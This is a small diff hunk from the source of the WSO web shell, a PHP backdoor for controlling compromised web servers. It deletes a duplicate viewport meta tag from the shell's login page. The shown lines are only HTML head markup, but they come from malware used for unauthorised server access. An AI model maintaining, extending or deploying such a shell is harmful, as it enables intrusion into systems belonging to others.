@@ -43,7 +43,7 @@ function wsoLogin() {
 	<title>Wso ".WSO_VERSION." Shell</title>
 	<link rel='shortcut icon' href='https://cdn3.iconfinder.com/data/icons/fatcow/32/bomb.png'>
 	<meta name='viewport' content='width=device-width, initial-scale=1'>
-	<meta name='viewport' content='width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no'>
+	
 	<link rel='stylesheet' href='https://bootswatch.com/superhero/bootstrap.min.css'>
 	</head>
     <body style=''>
